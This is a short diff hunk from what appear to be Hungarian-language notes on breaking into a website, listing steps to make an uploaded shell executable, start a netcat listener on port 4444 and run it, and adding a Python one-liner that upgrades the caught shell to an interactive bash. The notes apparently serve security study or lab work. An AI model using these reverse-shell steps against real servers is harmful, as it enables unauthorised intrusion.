@@ -111,6 +111,8 @@ weboldal "feltörése":
     d, futtathatóvá tesszük a shellt 
     e, listener a saját gépünkön  nc -lvnp 4444
     f, futtatás
-    
+python3 -c "import pty;pty.spawn('/bin/bash')"
+
+
 
     
